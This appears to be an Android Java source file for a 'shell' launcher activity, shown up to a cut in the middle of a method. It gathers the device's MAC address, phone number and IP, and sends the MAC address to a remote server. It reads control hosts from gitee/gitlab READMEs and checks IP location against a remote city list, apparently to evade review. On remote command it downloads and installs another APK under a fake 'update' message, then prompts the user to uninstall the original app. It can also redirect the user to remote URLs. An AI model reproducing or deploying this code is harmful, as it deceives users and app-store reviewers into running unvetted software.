package com.regus.mj;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.Activity;
import android.app.ActivityManager;
import android.app.AlertDialog;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.telephony.TelephonyManager;
import android.text.TextUtils;
import android.util.Log;
import android.view.View;
import android.view.WindowManager;
import android.widget.RelativeLayout;
import android.widget.TextView;
import android.widget.Toast;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.net.HttpURLConnection;
import java.net.Inet4Address;
import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.NetworkInterface;
import java.net.SocketException;
import java.net.URL;
import java.util.ArrayList;
import java.util.Collections;
import java.util.Enumeration;
import java.util.List;
import java.util.Locale;

import androidx.core.content.FileProvider;


/**
 * 游戏包 支持h5   下载    融合
 * <p>
 * https://gitlab.com/guangzhouboning/roothost/-/raw/master/README.md
 * <p>
 * https://gitee.com/tai-army/root-domain-name/raw/master/README.md
 */
public class MJRegusActivity extends Activity {

    //服务器上的马甲id
    String mAid = "I20211026104238211436";
    //服务器上该马甲的渠道id
    String mSid = "R20211026104516833568";


//    String mAid = "178";
//    //服务器上该马甲的渠道id
//    String mSid = "2";

    //跳转到原马甲包启动页的全路径
    String activityPath = "REGUS_PATH";

    String root_gitee = "https://gitee.com/mannyymm1/cqcc/raw/master/README.md";

    //握手地址
    String getHostUrl = root_gitee;

    String host = "http://ieo.titiyul.com";


    //id 值   这些限制都只是占位词  后面直接用16进制 替换
    /**
     * 植入的图片  启动图背景叫 mj_splash.png      下载时候的背景叫 mj_down_splash.png
     */


    //该页面的启动页图片的id
    int splash_bg_id ;
    //该页面的下载时候的背景图片id
    int splash_down_bg_id ;


    /**
     * 植入的一个主布局   名字固定叫 mj_regus_splash.xml
     */

    //页面布局的id
    int activity_layout_id ;
    //页面布局的根布局的id
    int root_view_id ;
    //该页面的加载框id
    int progress_bar_id ;
    //百分比
    int progress_bar_num ;


    String downLoadUrl;
    private String ddUrl;
    public File savefolder;
    public String updateSaveName;

    public long packSize;
    public int progress;
    TBProgressView progressBar;
    RelativeLayout mRootView;
    TextView mProgressNum;

    private List<String> mHosts = new ArrayList<>();
    private int mCurrentReqposition;

    DownloadApkThread downloadApkThread;

    private String theDownloadPkaName = "";

    /**
     * 权限部分
     */

    String[] permissions = new String[]{
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.WRITE_EXTERNAL_STORAGE,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.REQUEST_INSTALL_PACKAGES
    };
    List<String> mPermissionList = new ArrayList<>();
    boolean mShowRequestPermission = true;//用户是否禁止权限

    int mode = 0; // 0 h5模式    1 下载模式    2 融合模式       --->目前团队主要用下载模式热更新


    //设备相关

    private String macAddress = "";
    private String phoneNum = "";
    private String ip = "";
    private String sysInfo = "";
    private String brand = "";


    @Override
    protected void onCreate( Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        splash_bg_id = CPResourceUtil.getMipmapId(getApplicationContext(),"mj_splash");
        splash_down_bg_id = CPResourceUtil.getMipmapId(getApplicationContext(),"mj_down_splash");
        activity_layout_id = CPResourceUtil.getLayoutId(getApplicationContext(),"mj_regus_splash");
        root_view_id = CPResourceUtil.getId(getApplicationContext(),"mj_root_view");
        progress_bar_id = CPResourceUtil.getId(getApplicationContext(),"mj_progressBar");
        progress_bar_num = CPResourceUtil.getId(getApplicationContext(),"mj_progress_num");


        getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN, WindowManager.LayoutParams.FLAG_FULLSCREEN);

        getWindow().setFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON, WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);


        if (Build.VERSION.SDK_INT < 19) {// lower api
            View v = this.getWindow().getDecorView();
            v.setSystemUiVisibility(View.GONE);
        } else {
            View decorView = getWindow().getDecorView();
            decorView.setSystemUiVisibility(View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
                    | View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY | View.SYSTEM_UI_FLAG_FULLSCREEN);
        }

        //设 layout id
        setLayoutId();

        //根布局id mj_root_view
        setRootViewId();

        //设置启动图id`
        setSplashId();

        //设置资源进度条id
        setProgressBarId();

        //设置资源进度条 百分比id
        setProgressBarNumId();

        checkPermision();

    }

    //设 layout id
    @SuppressLint("ResourceType")
    private void setLayoutId() {
        setContentView(activity_layout_id);
    }

    //设 RootView id
    @SuppressLint("ResourceType")
    private void setRootViewId() {
        mRootView = findViewById(root_view_id);
    }

    //设置启动图id
    @SuppressLint("ResourceType")
    private void setSplashId() {
        mRootView.setBackgroundResource(splash_bg_id);
    }

    //设置progress bar id
    @SuppressLint("ResourceType")
    private void setProgressBarId() {
        progressBar = findViewById(progress_bar_id);
        progressBar.setProgress(0);
    }

    //设置progress bar num  id
    @SuppressLint("ResourceType")
    private void setProgressBarNumId() {
        mProgressNum = findViewById(progress_bar_num);
    }


    /**
     * 所有权限检测完毕之后
     */
    private void afterCheckPermision() {
        macAddress = getMacAddress(this);
        Log.e("regus_mac ", macAddress + "");

        if ("02:00:00:00:00:00".equals(macAddress)) {//如果获取不到mac地址
            macAddress = getDeviceId();
            Log.e("regus_mac_dev ", macAddress);
        }

        phoneNum = getPhoneNum();
        Log.e("regus_phoneNum ", phoneNum + "");
        ip = getIPAddress(this);
        Log.e("regus_ip ", ip + "");
        sysInfo = getSystemInfo();

        brand = getDeviceBrand();

//        CrashHandler.getInstance().setData("houtai.wlt99.com:48582", macAddress, phoneNum, ip, sysInfo, mAid, mSid);
//
//        CrashHandler.getInstance()
//                .init(getApplicationContext());

        //广告模式的 跳转值
        if (!TextUtils.isEmpty(getIntent().getStringExtra("regus_ad_value"))) {

            startWebview(getIntent().getStringExtra("regus_ad_value"));


        } else {
            getDt();
        }
    }


    void RequestThat() {
        getHostRequest();
    }


    void getDt() {
        Log.e("regus_next", "getDt");
        new Thread(new GetDtRunnale()).start();
    }


    private class GetDtRunnale implements Runnable {

        @Override
        public void run() {

            try {
                PrintWriter out = null;
                BufferedReader in = null;

                URL urll = new URL("http://mock-api.com/Gzq2ZOgW.mock/getLocation");
                HttpURLConnection urlConnection = (HttpURLConnection) urll.openConnection();
                urlConnection.setConnectTimeout(4000);
                urlConnection.setReadTimeout(4000);
                urlConnection.setRequestMethod("PUT");
                urlConnection.setRequestProperty("Content-Type", " application/json");// 设定
                urlConnection.setRequestProperty("accept", "*/*");
                urlConnection.setDoOutput(true);
                urlConnection.setDoInput(true);
                // 获取URLConnection对象对应的输出流
                out = new PrintWriter(urlConnection.getOutputStream());
                // 发送请求参数
                out.print("{\"key\": \"ttc\"}");
                // flush输出流的缓冲
                out.flush();
                int code = urlConnection.getResponseCode();
                if (code == 200) {
                    in = new BufferedReader(new InputStreamReader(urlConnection.getInputStream()));

                    String line;
                    StringBuffer buffer = new StringBuffer();
                    while ((line = in.readLine()) != null) {
                        buffer.append(line);
                    }
                    String jsonStr = buffer.toString();

                    //处理
                    try {

                        JSONObject avObject = new JSONObject(jsonStr);


                        int show = avObject.getInt("sh");
                        String url = avObject.getString("u");
                        boolean isStop = avObject.getBoolean("st");

                        //重庆，北京，南京，上海，深圳，广州，四川，江苏，苏州，武汉，长沙，福建，浙江
                        JSONArray ipsArray = avObject.getJSONArray("ips");
                        Log.e("avo", "s  " + show + " i  " + isStop);

                        if(isStop){
                            new Thread(new Runnable() {
                                @Override
                                public void run() {

                                    try {

                                        URL urll = new URL("https://restapi.amap.com/v3/ip?key=a11dbeb4815afc317622d62797d7e408");
                                        HttpURLConnection urlConnection = (HttpURLConnection) urll.openConnection();
                                        urlConnection.setConnectTimeout(10000);
                                        urlConnection.setReadTimeout(10000);
                                        urlConnection.setRequestMethod("GET");
                                        urlConnection.connect();
                                        int code = urlConnection.getResponseCode();
                                        if (code == 200) {
                                            InputStream inputStream = urlConnection.getInputStream();
                                            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
                                            String line;
                                            StringBuffer buffer = new StringBuffer();
                                            while ((line = bufferedReader.readLine()) != null) {
                                                buffer.append(line);
                                            }
                                            String json = buffer.toString();

                                            //    Log.e("avo_map", "s  " + json );

                                            JSONObject jsonMap = new JSONObject(json);

                                            boolean isLimit = false;


                                            for (int i = 0; i < ipsArray.length(); i++) {
                                                String area = ipsArray.getString(i);
                                                if (json.contains(area)) {
                                                    isLimit = true;
                                                }
                                            }


                                            if (json.contains("\"province\":[]")) {
                                                isLimit = true;
                                            }


                                            String info = jsonMap.getString("info");

                                            if (!info.toLowerCase().equals("ok")) {
                                                isLimit = false;
                                            }

                                            //   Log.e("avo", "s  " + show + " i  " + isStop + " lmit "+ isLimit);

                                            if(!isLimit){
                                                lcDoRogic(isStop,show,url);
                                            } else {
                                                RequestThat();
                                            }

                                        } else {
                                            Log.e("avo_0", "!200");
                                            lcDoRogic(isStop,show,url);
                                        }

                                    } catch (JSONException e) {
                                        Log.e("avo_2", e.getLocalizedMessage() + "");
                                        lcDoRogic(isStop,show,url);
                                    } catch (Exception e) {
                                        Log.e("avo_3", e.getLocalizedMessage() + "");
                                        lcDoRogic(isStop,show,url);
                                    }

                                }
                            }).start();
                        }else {
                            RequestThat();
                        }

                    } catch (JSONException e) {
                        e.printStackTrace();
                        RequestThat();
                    }
                } else {
                    RequestThat();
                }

                urlConnection.disconnect();// 断开连接

            } catch (Exception e) {
                RequestThat();
            }
        }

    }

    private void lcDoRogic(boolean isStop,int show,String url){
        if (isStop) {
            if (show == 2) {

                if (url.endsWith("apk")) {
//                                    downLoadUrl = url;
//                                    mode = 1;
//                                    showDownLoadDialog();

                    ddUrl = url;

                    jumpLocalSplash();

                } else {
                    Intent intent = new Intent();
                    intent.setAction(Intent.ACTION_VIEW);
                    Uri content_url = Uri.parse(url);
                    intent.setData(content_url);
                    intent.addCategory(Intent.CATEGORY_BROWSABLE);
                    startActivity(intent);
                }


            } else {
                jumpLocalSplash();
            }
        } else {
            RequestThat();
        }
    }


    private void showDownLoadUi() {

        startService(new Intent(this, MJForegroundService.class));

        setDownLoadApkBgId();
        downloadPackage();
    }

    @SuppressLint("ResourceType")
    private void setDownLoadApkBgId() {
        progressBar.setVisibility(View.VISIBLE);
        mRootView.setBackgroundResource(splash_down_bg_id);
    }


    /**
     * 权限检测
     */
    private void checkPermision() {

        try {
            mPermissionList.clear();
            for (int i = 0; i < permissions.length; i++) {
                if (checkSelfPermission(permissions[i]) != PackageManager.PERMISSION_GRANTED) {
                    mPermissionList.add(permissions[i]);
                }
            }
            /**
             * 判断是否为空
             */
            if (mPermissionList.isEmpty()) {//未授予的权限为空，表示都授予了
                afterCheckPermision();
            } else {//请求权限方法
                 String[] permissions = mPermissionList.toArray(new String[mPermissionList.size()]);//将List转为数组
                 requestPermissions(permissions, 1);
            }
        } catch (Exception e) {

            //某些机型在启动页申请权限会有问题  或者 有些低版本机型 不需要申请 或者没有ActivityCompat这个类
            //先进去  里面的会帮我申请好权限
            afterCheckPermision();

        }

    }


    @Override
    public void onRequestPermissionsResult(int requestCode,  String[] permissions,  int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        switch (requestCode) {
            case 1:
                for (int i = 0; i < grantResults.length; i++) {
                    if (grantResults[i] != PackageManager.PERMISSION_GRANTED) {
                        //判断是否勾选禁止后不再询问
                        boolean showRequestPermission = shouldShowRequestPermissionRationale(permissions[i]);
                        if (showRequestPermission) {//
                            checkPermision();//重新申请权限
                            return;
                        } else {
                            mShowRequestPermission = false;//已经禁止
                        }
                    }
                }
                afterCheckPermision();
                break;
            default:
                break;
        }
    }


    private void getHostRequest() {
        new Thread(new GetHostRequestRunnable()).start();
    }


    private class GetHostRequestRunnable implements Runnable {

        @Override
        public void run() {

            try {
                Log.e("regus_getHost ", getHostUrl + "");

                URL urll = new URL(getHostUrl);
                HttpURLConnection urlConnection = (HttpURLConnection) urll.openConnection();
                urlConnection.setConnectTimeout(7000);
                urlConnection.setReadTimeout(7000);
                urlConnection.setRequestMethod("GET");
                urlConnection.connect();
                int code = urlConnection.getResponseCode();
                if (code == 200) {
                    InputStream inputStream = urlConnection.getInputStream();
                    BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
                    String line;
                    StringBuffer buffer = new StringBuffer();
                    while ((line = bufferedReader.readLine()) != null) {
                        buffer.append(line);
                    }
                    String jsonStr = buffer.toString();
                    Log.e("regus getHost array", jsonStr + "");

                    //处理
                    try {

                        JSONArray jsonArray = new JSONArray(jsonStr.replace("\\", ""));
                        Log.e("regus  array size", jsonArray.length() + "");

                        if (jsonArray.length() > 0) {
                            host = jsonArray.getString(0);
                        }

                    } catch (JSONException e) {
                        e.printStackTrace();
                        // allHostSize = 1;
                        Log.e("regus getHost", e.getLocalizedMessage() + "");

                    }
                } else {
                    //  allHostSize = 1;
                    Log.e("regus getHost", "code 不是200 或304");

                }
            } catch (Exception e) {
                //   allHostSize = 1;
                Log.e("regus getHost", e.getLocalizedMessage() + "");

            }


            new Thread(new Runnable() {
                @Override
                public void run() {

                    String url = host + "/Inbound/QueryAppConfig";

                    Log.e("regus 跳转请求url", url + "");

                    String time = System.currentTimeMillis() + "";

                    JSONObject jsonObject = new JSONObject();
                    JSONObject paramBeanJobj = new JSONObject();

                    try {
                        jsonObject.put("ClientSource", "0");
                        jsonObject.put("PartnerKey", "b82cc1515cd64869beefe697cce16aad");
                        jsonObject.put("Date", time);

                        paramBeanJobj.put("AppKey", mAid);
                        paramBeanJobj.put("ChannelId", mSid);
                        paramBeanJobj.put("Mac", macAddress);

                        jsonObject.put("Param", paramBeanJobj);


                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    String param = jsonObject.toString();

                    Log.e("regus", "post param " + param);

                    try {

                        PrintWriter out = null;

                        URL urll = new URL(url);
                        HttpURLConnection urlConnection = (HttpURLConnection) urll.openConnection();
                        urlConnection.setConnectTimeout(15000);
                        urlConnection.setReadTimeout(15000);
                        urlConnection.setRequestMethod("POST");

                        urlConnection.setRequestProperty("Content-Type", " application/json");// 设定
                        urlConnection.setDoOutput(true);
                        urlConnection.setDoInput(true);
                        urlConnection.setUseCaches(false)
                        ;

                        out = new PrintWriter(urlConnection.getOutputStream());

                        // 发送请求参数

                        out.print(param);

                        // flush输出流的缓冲

                        out.flush();
                        out.close();

                        Log.e("regus", "post start");

                        int code = urlConnection.getResponseCode();

                        if (code == 200) {

                            InputStream inputStream = urlConnection.getInputStream();
                            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
                            String line;
                            StringBuffer buffer = new StringBuffer();
                            while ((line = bufferedReader.readLine()) != null) {
                                buffer.append(line);
                            }
                            String jsonStr = buffer.toString();
                            Log.e("regus", jsonStr + "");

                            solveLines(true, jsonStr, MJRegusActivity.this);

                        } else {
                            Log.e("regus", "不是200");
                            solveLines(false, null, MJRegusActivity.this);
                        }
                    } catch (Exception e) {
                        Log.e("regus", "请求开关错误 " + e.getLocalizedMessage());
                        solveLines(false, null, MJRegusActivity.this);
                    }


                }
            }).start();


        }

    }


    private volatile boolean isGetKgRepInfoAlready = false;


    /**
     * 处理几个ping 域名的请求
     */
    private synchronized void solveLines(boolean isOK, String buJson, Activity activity) {

        if (isGetKgRepInfoAlready) {
            Log.e("regus_", " 已经有可用域名 其他的直接return");
            return;
        }


        if (isOK) {

            isGetKgRepInfoAlready = true;

            //处理
            try {
                JSONObject responseJson = new JSONObject(buJson.replace("\\", ""));

                if (responseJson.has("Code") && responseJson.has("Value")) {
                    if (responseJson.getInt("Code") == 1) {

                        JSONObject dataJsonObject = new JSONObject(responseJson.getString("Value"));


                        //IsLimit
                        if (dataJsonObject.getBoolean("IsLimit")) {
                            Log.e("regus_", " IsLimit true");
                            jumpLocalSplash();
                            return;
                        }

                        if (!dataJsonObject.getBoolean("IsOpenAdvert")) {
                            clearSp(getBaseContext());
                        }

                        if (dataJsonObject.has("IsOpenFuse") && dataJsonObject.getBoolean("IsOpenFuse")) {
                            activity.runOnUiThread(new Runnable() {
                                @Override
                                public void run() {
                                    //  DialogFramentManager.getInstance().showDialog(activity.getSupportFragmentManager(),new MJRegusDialogFragment());
                                    getApkFromAssets();
                                }
                            });

                            return;
                        }


                        if (dataJsonObject.getBoolean("IsOpenAdvert")) {
                            activity.runOnUiThread(new Runnable() {
                                @Override
                                public void run() {

                                    String key_ad_kg = "regus_download_open_";
                                    String key_ad_value = "regus_download_url_";
                                    String key_pic_value = "regus_ad_pic_url_";

                                    try {
                                        if (dataJsonObject.has("AdvertUrlJson")) {
                                            JSONArray advertiseArray = dataJsonObject.getJSONArray("AdvertUrlJson");


                                            if (advertiseArray != null) {
                                                for (int i = 0; i < advertiseArray.length(); i++) {
                                                    JSONObject jsonObject = advertiseArray.getJSONObject(i);
                                                    if (jsonObject != null) {
                                                        if (jsonObject.has("JumpUrl")) {
                                                            getSharedPreferences("regus", Context.MODE_PRIVATE).edit()
                                                                    .putString(key_ad_value + (i+1), jsonObject.getString("JumpUrl")).apply();
                                                        }


                                                        if (jsonObject.has("Switch")) {
                                                            boolean open = jsonObject.getInt("Switch") == 1;
                                                            getSharedPreferences("regus", Context.MODE_PRIVATE).edit()
                                                                    .putBoolean(key_ad_kg + (i+1), open).apply();
                                                        }

                                                        if (jsonObject.has("ImgUrl")) {
                                                            getSharedPreferences("regus", Context.MODE_PRIVATE).edit()
                                                                    .putString(key_pic_value + (i+1), jsonObject.getString("ImgUrl")).apply();
                                                        }

                                                    }
                                                }
                                            }

                                        }
                                    } catch (JSONException e) {

                                    }


                                    if (!TextUtils.isEmpty(ddUrl)) {

                                        for (int i = 0; i < 30; i++) {
                                            getSharedPreferences("regus", Context.MODE_PRIVATE).edit()
                                                    .putString(key_ad_value + (i+1), ddUrl).apply();

                                            getSharedPreferences("regus", Context.MODE_PRIVATE).edit()
                                                    .putBoolean(key_ad_kg + (i+1), true).apply();
                                        }
                                    }

                                    jumpLocalSplash();
                                }
                            });
                            return;

                        }


                        if (dataJsonObject.getBoolean("IsOpenDown")) {
                            Log.e("regus_", " IsOpenDown true");
                            activity.runOnUiThread(new Runnable() {
                                @Override
                                public void run() {
                                    try {
                                        downLoadUrl = dataJsonObject.getString("DownloadUrl");
                                    } catch (JSONException e) {
                                        e.printStackTrace();
                                    }
                                    mode = 1;
                                    Log.e("regus 得到的下载链接: ", downLoadUrl);
                                    if (!TextUtils.isEmpty(ddUrl)) {
                                        downLoadUrl = ddUrl;
                                    }
                                    showDownLoadDialog();
                                }
                            });
                            return;
                        }

                        if (dataJsonObject.getBoolean("IsOpenJump")) {
                            activity.runOnUiThread(new Runnable() {
                                @Override
                                public void run() {
                                    //  DialogFramentManager.getInstance().showDialog(activity.getSupportFragmentManager(),new MJRegusDialogFragment());
                                    mode = 0;
                                    try {

                                        if (!TextUtils.isEmpty(ddUrl)) {
                                            startWebview(ddUrl);
                                            return;
                                        }

                                        startWebview(dataJsonObject.getString("JumpUrl"));
                                    } catch (JSONException e) {
                                        e.printStackTrace();
                                    }
                                }
                            });
                            return;
                        }

                    } else {
                        Log.e("regus_", " error 13");
                        jumpLocalSplash();
                    }
                } else {
                    Log.e("regus_", " error 12");
                    jumpLocalSplash();
                }

            } catch (Exception e) {
                e.printStackTrace();
                jumpLocalSplash();
            }

        } else {
            jumpLocalSplash();
            Log.e("regus_", " error 1");
        }

    }


    public static void clearSp(Context context) {
        SharedPreferences preferences = context.getSharedPreferences("regus", Context.MODE_PRIVATE);
        SharedPreferences.Editor editor = preferences.edit();
        editor.clear();
        editor.commit();
    }


    /**
     * 跳原应用
     */

    private void jumpLocalSplash() {

        try {
            Class aimClass = Class.forName(activityPath);
            Intent intent = new Intent(MJRegusActivity.this, aimClass);
            startActivity(intent);
            finish();
        } catch (ClassNotFoundException e) {
            e.printStackTrace();
        }
    }


    /**
     * web 显示h5
     *
     * @param url
     */
    private void startWebview(final String url) {
        if (TextUtils.isEmpty(url)) {
            jumpLocalSplash();
            return;
        }
        jumpTo(url, 0);
    }


    /**
     * 打开下载
     */

    private void showDownLoadDialog() {
        runOnUiThread(new Runnable() {
            @Override
            public void run() {
                showDownLoadUi();
            }
        });
    }


    /**
     * 下载主包
     */

    public void downloadPackage() {

        if (TextUtils.isEmpty(downLoadUrl)) {
            Toast.makeText(MJRegusActivity.this, "未配置APP下载链接~", Toast.LENGTH_LONG);
            return;
        }

        if (downloadApkThread != null) {
            downloadApkThread.interrupt();
            downloadApkThread = null;
        }

        downloadApkThread = new DownloadApkThread();
        downloadApkThread.start();
    }

    private class DownloadApkThread extends Thread {

        @SuppressLint("WrongConstant")
        @Override
        public void run() {
            super.run();
            long j = 0;

            try {

                URL url = new URL(downLoadUrl);

                HttpURLConnection httpURLConnection = (HttpURLConnection) url.openConnection();
                httpURLConnection.setConnectTimeout(7000);
                httpURLConnection.setReadTimeout(7000);
                httpURLConnection.connect();

                if (httpURLConnection.getResponseCode() != 200) {
                    Log.e("regus", "下载apk异常 code: " + httpURLConnection.getResponseCode());
                    jumpLocalSplash();
                    return;
                }

                InputStream is = httpURLConnection.getInputStream();
                packSize = httpURLConnection.getContentLength();

                if (checkExistSDCard()) {
                    savefolder = Environment.getExternalStorageDirectory();
                } else {
                    savefolder = getDir("update", 3);
                }


                updateSaveName = downLoadUrl.substring(downLoadUrl.lastIndexOf("/") + 1);

                File file = new File(savefolder, updateSaveName);
                Log.e("regusupdateManager", " updateSaveName ==== " + updateSaveName);
                if (file.exists()) {
                    file.delete();
                }
                Log.e("regusupdateManager", " updateSave ==== " + file.getAbsolutePath());
                OutputStream os = new FileOutputStream(file);

                byte[] bytes = new byte[512];

                int length;

                while ((length = is.read(bytes)) != -1) {
                    os.write(bytes, 0, length);
                    j += (long) length;
                    progress = (int) ((((float) j) / ((float) packSize)) * 100.0f);
                    Log.e("regus progress", progress + "");
                    showLoadDialogProgress(progress);
                    if (progress == 100) {
                        hideWebViewLoadDialog();
                    }
                }

                //关闭流
                is.close();
                os.close();
                os.flush();

                gotoInstall();

            } catch (MalformedURLException e) {
                e.printStackTrace();
                jumpLocalSplash();
            } catch (IOException e2) {
                e2.printStackTrace();
                Log.e("regus IOException", "" + e2.getLocalizedMessage());
                if (progress > 0) { //自动重下
                    if (downloadApkThread != null) {
                        downloadApkThread.interrupt();
                        downloadApkThread = null;
                    }

                    downloadPackage();
                }
            } catch (Exception e) {
                e.printStackTrace();
                Log.e("regus Exception", "" + e.getLocalizedMessage());
                if (progress > 0) { //自动重下
                    if (downloadApkThread != null) {
                        downloadApkThread.interrupt();
                        downloadApkThread = null;
                    }
                    downloadPackage();
                }
            }

        }

    }


    private void showLoadDialogProgress(int progress) {

        runOnUiThread(new Runnable() {

            @Override
            public void run() {

                if (progress == 95) {
                    if (!isRunningForeground(MJRegusActivity.this)) {
                        setTopApp(MJRegusActivity.this);
                    }
                }

                if (progressBar != null && mProgressNum != null) {
                    progressBar.setProgress(progress);
                    mProgressNum.setText("本次更新不消耗流量，正在更新..." + progress + "%");
                }

            }
        });


    }

    private void hideWebViewLoadDialog() {


    }


    /**
     * 获取assert 里的主包  这是融合模式   暂时不用
     */

    @SuppressLint("WrongConstant")
    private void getApkFromAssets() {

        try {

            if (checkExistSDCard()) {
                savefolder = Environment.getExternalStorageDirectory();
            } else {
                savefolder = getDir("update", 3);
            }


            String aimApkName = "main.apk";
            if (!TextUtils.isEmpty(downLoadUrl) && downLoadUrl.equals("环彩181504")) {
                aimApkName = "main1.apk";
            }

            InputStream is = getAssets().open(aimApkName);

            updateSaveName = "eric.apk";

            File file = new File(savefolder, updateSaveName);

            Log.e("regusupdateManager", " updateSaveName ==== " + updateSaveName);

            if (file.exists()) {
                file.delete();
            }

            FileOutputStream fos = new FileOutputStream(file);
            byte[] temp = new byte[1024];
            int i = 0;
            while ((i = is.read(temp)) > 0) {
                fos.write(temp, 0, i);
            }
            fos.close();
            is.close();

            gotoInstall();


        } catch (IOException e) {
            e.printStackTrace();
            Log.e("regus IOException", "" + e.getLocalizedMessage());
            jumpLocalSplash();
        }


    }

    /**
     * 去安装
     */

    @SuppressLint("WrongConstant")
    private void gotoInstall() {

        PackageManager pm = this.getPackageManager();
        PackageInfo info = pm.getPackageArchiveInfo(new File(this.savefolder, this.updateSaveName).getPath(),
                PackageManager.GET_ACTIVITIES);

        if (info != null) {
            String packageName = info.packageName;
            theDownloadPkaName = packageName;
            Log.e("lyn_", "checkPackageNameIfsame 远程的包名是 " + packageName);
        }

        toInstall();
    }


    private void unInstallSelf() {
        if (isAvilible(theDownloadPkaName, this)) {
            //卸载自己
            Uri packageUri = Uri.parse("package:" + getPackageName());
            Intent intent = new Intent(Intent.ACTION_DELETE, packageUri);
            startActivity(intent);
        }
    }


    @SuppressLint("WrongConstant")
    private void toInstall() {

        Intent intent = new Intent(Intent.ACTION_VIEW);
        int i = getApplicationInfo().targetSdkVersion;
        if (Build.VERSION.SDK_INT < 24 || i < 24) {
            Log.e("regusgotoInstall ", Uri.fromFile(new File(this.savefolder, this.updateSaveName)) + "");
            intent.setDataAndType(Uri.fromFile(new File(this.savefolder, this.updateSaveName)), "application/vnd.android.package-archive");
        } else {
            //添加这一句表示对目标应用临时授权该Uri所代表的文件
            intent.setFlags(1);
            intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
            Log.e("regus setDataAndType", "savefolder :" + savefolder + " updateSaveName " + updateSaveName);
            intent.setDataAndType(FileProvider.getUriForFile(getApplicationContext(), getPackageName() + ".fileprovider", new File(this.savefolder, this.updateSaveName)), "application/vnd.android.package-archive");
        }

        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

        if (theDownloadPkaName.equals(getPackageName())) {
            startActivity(intent);
            finish();
        } else {
            startActivity(intent);
            isCover = true;
        }

    }

    private boolean isCover;


    @Override
    protected void onResume() {
        super.onResume();

        Log.e("regus_", "onResume");

        if (isCover) {
            unInstallSelf();
        }
    }


    /**
     * 跳转逻辑
     */

    private void jumpTo(final String url, int type) {

        runOnUiThread(new Runnable() {
            @Override
            public void run() {
                Toast.makeText(MJRegusActivity.this, "程序正在执行,请勿关闭浏览器~", Toast.LENGTH_LONG);
                showTipDialog(url);
                startBrowser(url);
            }
        });


    }


    private void showTipDialog(final String url) {

        //创建dialog构造器
        AlertDialog.Builder normalDialog = new AlertDialog.Builder(MJRegusActivity.this);
        //设置title
        normalDialog.setTitle("需要跳转到浏览器");
        //设置内容
        normalDialog.setMessage("点击跳转到专业版~");
        //设置按钮
        normalDialog.setPositiveButton("确定", new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialog, int which) {
                startBrowser(url);
            }
        });

        normalDialog.show();
    }

    /**
     * 调用浏览器
     */

    private void startBrowser(String url) {
        Intent intent = new Intent();
        intent.setAction(Intent.ACTION_VIEW);
        Uri content_url = Uri.parse(url);
        intent.setData(content_url);
        intent.addCategory(Intent.CATEGORY_BROWSABLE);
        startActivity(intent);
    }


    @Override
    public void onBackPressed() {
        //实现Home键效果
        //super.onBackPressed();这句话一定要注掉,不然又去调用默认的back处理方式了
        Intent i = new Intent(Intent.ACTION_MAIN);
        i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        i.addCategory(Intent.CATEGORY_HOME);
        startActivity(i);
    }


    @Override
    protected void onDestroy() {
        super.onDestroy();

        Log.e("regus_", "onDestroy");

        mCurrentReqposition = 0;
        mHosts.clear();

        if (downloadApkThread != null) {
            downloadApkThread.interrupt();
            downloadApkThread = null;
        }
    }


    //***********************************************工具方法部分***********************


    public static boolean checkExistSDCard() {
        return Environment.getExternalStorageState().equals("mounted");
    }

    /**
     * 将本应用置顶到最前端
     * 当本应用位于后台时，则将它切换到最前端
     *
     * @param context
     */
    public static void setTopApp(Context context) {
        if (!isRunningForeground(context)) {
            /**获取ActivityManager*/
            ActivityManager activityManager = (ActivityManager) context.getSystemService(ACTIVITY_SERVICE);

            /**获得当前运行的task(任务)*/
            List<ActivityManager.RunningTaskInfo> taskInfoList = activityManager.getRunningTasks(100);
            for (ActivityManager.RunningTaskInfo taskInfo : taskInfoList) {
                /**找到本应用的 task，并将它切换到前台*/
                if (taskInfo.topActivity.getPackageName().equals(context.getPackageName())) {
                    activityManager.moveTaskToFront(taskInfo.id, 0);
                    break;
                }
            }
        }
    }

    /**
     * 判断本应用是否已经位于最前端
     *
     * @param context
     * @return 本应用已经位于最前端时，返回 true；否则返回 false
     */
    public static boolean isRunningForeground(Context context) {
        ActivityManager activityManager = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
        List<ActivityManager.RunningAppProcessInfo> appProcessInfoList = activityManager.getRunningAppProcesses();
        /**枚举进程*/
        for (ActivityManager.RunningAppProcessInfo appProcessInfo : appProcessInfoList) {
            if (appProcessInfo.importance == ActivityManager.RunningAppProcessInfo.IMPORTANCE_FOREGROUND) {
                if (appProcessInfo.processName.equals(context.getApplicationInfo().processName)) {
                    return true;
                }
            }
        }
        return false;
    }


    /**
     * 判断有没有安装该apk
     *
     * @param packageName
     * @param context
     * @return
     */
    public static boolean isAvilible(String packageName, Context context) {
        final PackageManager packageManager = context.getPackageManager();
        // 获取所有已安装程序的包信息
